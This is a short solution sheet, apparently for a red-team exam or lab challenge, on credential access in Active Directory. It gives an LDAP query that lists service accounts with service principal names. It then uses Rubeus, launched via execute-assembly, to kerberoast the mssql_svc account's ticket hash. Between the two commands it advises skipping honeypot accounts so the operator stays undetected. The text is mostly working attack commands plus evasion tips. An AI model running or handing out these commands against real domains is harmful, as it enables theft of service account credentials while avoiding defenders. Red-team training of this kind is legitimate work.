# Credential Access Challenge Solution commands  

>Opsec Safe way enumeration of all target accounts with not null SPN value set, not krbtgt account and not disabled accounts.  

```sh
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
```  

>Spot honey accounts not real to be noted in exam to skip accounts that can detect our presence in exam.

>Obtain HASH value for only `mssql_svc` target account and not triggering the honeypot accounts, remaining undetected.  

```sh
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```  

